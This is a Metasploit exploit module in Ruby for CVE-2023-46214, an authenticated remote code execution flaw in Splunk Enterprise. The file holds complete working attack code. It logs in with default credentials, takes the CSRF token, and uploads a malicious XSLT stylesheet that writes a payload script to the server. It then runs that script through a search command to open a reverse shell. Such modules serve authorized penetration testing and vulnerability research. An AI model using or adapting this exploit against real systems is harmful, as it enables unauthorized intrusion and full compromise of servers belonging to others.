##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Splunk Authenticated XSLT Upload RCE',
        'Description' => %q{
          This exploit module targets a Remote Code Execution vulnerability in Splunk Enterprise.
          Vulnerable versions include 9.0.x before 9.0.7 and 9.1.x before 9.1.2.
          Successful exploitation requires valid credentials (default: admin:changeme).
        },
        'Author' => [
          'nathan', # Writeup and PoC
          'Valentin Lobstein', # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-46214'],
          ['URL', 'https://github.com/nathan31337/Splunk-RCE-poc'],
          [ 'URL', 'https://advisory.splunk.com/advisories/SVD-2023-1104' ], # Vendor Advisory
          [ 'URL', 'https://blog.hrncirik.net/cve-2023-46214-analysis' ], # Writeup
        ],
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2023-11-28',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8000
        },
        'Privileged' => false,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username for Splunk', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for Splunk', 'changeme']),
      ]
    )
  end

  def exploit
    auth_result, cookie_string = authenticate
    unless auth_result
      fail_with(Failure::NoAccess, 'Authentication failed')
      return
    end

    sleep(0.3)
    csrf_token, updated_cookie_string = fetch_csrf_token(cookie_string)
    unless csrf_token
      fail_with(Failure::NoAccess, 'Failed to obtain CSRF token')
      return
    end

    sleep(0.3)
    malicious_xsl = generate_malicious_xsl
    uploaded, text_value = upload_malicious_file(malicious_xsl, csrf_token, updated_cookie_string)
    unless uploaded
      fail_with(Failure::Unknown, 'File upload failed')
    end

    sleep(0.3)
    jsid_created, jsid = get_job_search_id(csrf_token, updated_cookie_string)
    unless jsid_created
      fail_with(Failure::Unknown, 'Creating job failed')
    end

    sleep(0.3)
    unless trigger_xslt_transform(jsid, text_value, updated_cookie_string)
      fail_with(Failure::Unknown, 'XSLT Transform failed')
    end

    sleep(0.3)
    unless trigger_reverse_shell(jsid, csrf_token, updated_cookie_string)
      fail_with(Failure::Unknown, 'Failed to execute reverse shell')
    end
  end

  def check
    unless splunk?
      return CheckCode::Unknown('Target does not appear to be a Splunk instance')
    end

    auth_result, cookie_string = authenticate
    unless auth_result
      fail_with(Failure::NoAccess, 'Authentication failed')
      return
    end

    version = get_version_authenticated(cookie_string)
    return CheckCode::Unknown('Unable to determine Splunk version') unless version

    if version.between?(Rex::Version.new('9.0.0'), Rex::Version.new('9.0.6')) ||
       version.between?(Rex::Version.new('9.1.0'), Rex::Version.new('9.1.1'))
      return CheckCode::Appears("Exploitable version found: #{version}")
    end

    CheckCode::Safe("Non-vulnerable version found: #{version}")
  end

  def trigger_reverse_shell(jsid, csrf_token, cookie_string)
    return false unless jsid && csrf_token

    runshellscript_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'servicesNS', datastore['USERNAME'], 'search', 'search', 'jobs')
    runshellscript_data = {
      'search' => "|runshellscript \"shell.sh\" \"\" \"\" \"\" \"\" \"\" \"\" \"\" \"#{jsid}\""
    }

    upload_headers = {
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    print_status("Executing reverse shell command at #{runshellscript_url}")
    res = send_request_cgi(
      'uri' => runshellscript_url,
      'method' => 'POST',
      'vars_post' => runshellscript_data,
      'headers' => upload_headers
    )

    unless res
      print_error('Failed to execute reverse shell: No response received')
      return false
    end

    if res.code == 201
      print_good('Reverse shell command executed successfully')
      return true
    end
    print_error("Failed to execute reverse shell: Server returned status code #{res.code}")
    false
  end

  def trigger_xslt_transform(jsid, text_value, cookie_string)
    return false unless jsid && text_value

    exploit_endpoint = normalize_uri(target_uri.path, 'en-US', 'api', 'search', 'jobs', jsid, 'results')
    exploit_endpoint << "?xsl=/opt/splunk/var/run/splunk/dispatch/#{text_value}/shell.xsl"

    xslt_headers = {
      'X-Splunk-Module' => 'Splunk.Module.DispatchingModule',
      'Connection' => 'close',
      'Upgrade-Insecure-Requests' => '1',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'X-Requested-With' => 'XMLHttpRequest',
      'Cookie' => cookie_string
    }

    print_status("Triggering XSLT transformation at #{exploit_endpoint}")
    res = send_request_cgi(
      'uri' => exploit_endpoint,
      'method' => 'GET',
      'headers' => xslt_headers
    )

    unless res
      print_error('Failed to trigger XSLT transformation: No response received')
      return false
    end

    if res.code == 200
      print_good('XSLT transformation triggered successfully')
      return true
    end
    print_error("Failed to trigger XSLT transformation: Server returned status code #{res.code}")
    false
  end

  def generate_malicious_xsl
    encoded_payload = Rex::Text.html_encode(payload.encoded)

    xsl_template = <<~XSL
      <?xml version="1.0" encoding="UTF-8"?>
      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
        <xsl:template match="/">
          <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
            <xsl:text>#{encoded_payload}</xsl:text>
          </exsl:document>
        </xsl:template>
      </xsl:stylesheet>
    XSL

    xsl_template
  end

  def get_job_search_id(csrf_token, cookie_string)
    return false, nil unless csrf_token

    jsid_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'servicesNS', datastore['USERNAME'], 'search', 'search', 'jobs')

    upload_headers = {
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    jsid_data = {
      'search' => '|search test|head 1'
    }

    print_status("Sending job search request to #{jsid_url}")
    res = send_request_cgi(
      'uri' => jsid_url,
      'method' => 'POST',
      'vars_post' => jsid_data,
      'headers' => upload_headers,
      'vars_get' => { 'output_mode' => 'json' }
    )

    unless res
      print_error('Failed to initiate job search: No response received')
      return false, nil
    end

    jsid = JSON.parse(res.body)['sid']
    return true, jsid if jsid
  end

  def upload_malicious_file(file_content, csrf_token, cookie_string)
    unless csrf_token
      print_error('CSRF token not found')
      return false, nil
    end

    post_data = Rex::MIME::Message.new
    post_data.add_part(file_content, 'application/xslt+xml', nil, 'form-data; name="spl-file"; filename="shell.xsl"')

    upload_headers = {
      'Accept' => 'text/javascript, text/html, application/xml, text/xml, */*',
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    upload_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__upload', 'indexing', 'preview')

    res = send_request_cgi(
      'uri' => upload_url,
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'headers' => upload_headers,
      'vars_get' => {
        'output_mode' => 'json',
        'props.NO_BINARY_CHECK' => 1,
        'input.path' => 'shell.xsl'
      }
    )

    unless res
      print_error('Malicious file upload failed: No response received')
      return false, nil
    end

    response_body = res.body
    if response_body.nil? || response_body.empty?
      print_error('Response body is empty')
      return false, nil
    end

    response_data = nil
    is_json = response_body.strip.start_with?('{') && response_body.strip.end_with?('}')

    if is_json
      response_data = JSON.parse(response_body)
    else
      print_error('Response is not in JSON format')
      return false, nil
    end

    if response_data && response_data['messages'] && !response_data['messages'].empty?
      text_value = response_data.dig('messages', 0, 'text')
      if text_value.include?('concatenate')
        print_error('Server responded with an error: concatenate found in the response')
        return false, nil
      end

      print_good('Malicious file uploaded successfully')
      return true, text_value
    else
      print_error('Server did not return a valid "messages" field')
      return false, nil
    end
  end

  def fetch_csrf_token(cookie_string)
    print_status('Extracting CSRF token from cookies')

    csrf_token_match = cookie_string.match(/splunkweb_csrf_token_8000=([^;]+)/)

    if csrf_token_match
      csrf_token = csrf_token_match[1]
      print_good("CSRF token successfully extracted: #{csrf_token}")

      en_us_url = normalize_uri(target_uri.path, 'en-US', 'app', 'launcher', 'home')
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => en_us_url,
        'cookie' => cookie_string
      })

      if res && res.code == 200
        new_cookies = res.get_cookies
        updated_cookie_string = cookie_string + new_cookies
      else
        updated_cookie_string = cookie_string
      end

      return [csrf_token, updated_cookie_string]
    else
      fail_with(Failure::NotFound, 'CSRF token not found in cookies')
      return [nil, nil]
    end
  end

  def get_version_authenticated(cookie_string)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/splunkd/__raw/services/authentication/users/', datastore['USERNAME']),
      'vars_get' => {
        'output_mode' => 'json'
      },
      'headers' => {
        'Cookie' => cookie_string
      }
    })

    return nil unless res&.code == 200

    body = res.get_json_document
    Rex::Version.new(body.dig('generator', 'version'))
  end

  def splunk?
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/account/login')
    }, 25)

    return true if res&.body =~ /Splunk/

    false
  end

  def authenticate
    login_url = normalize_uri(target_uri.path, 'en-US', 'account', 'login')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => login_url
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received for authentication request')
      return [false, nil]
    end

    cval_value = res.get_cookies.match(/cval=([^;]*)/)[1]

    unless cval_value
      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the cval cookie for authentication')
      return [false, nil]
    end

    auth_payload = {
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'cval' => cval_value,
      'set_has_logged_in' => 'false'
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_url,
      'cookie' => res.get_cookies,
      'vars_post' => auth_payload
    })

    if res && res.code == 200
      print_good('Successfully authenticated on the Splunk instance')
      return [true, res.get_cookies]
    else
      fail_with(Failure::NoAccess, 'Failed to authenticate on the Splunk instance')
      return [false, nil]
    end
  end
end
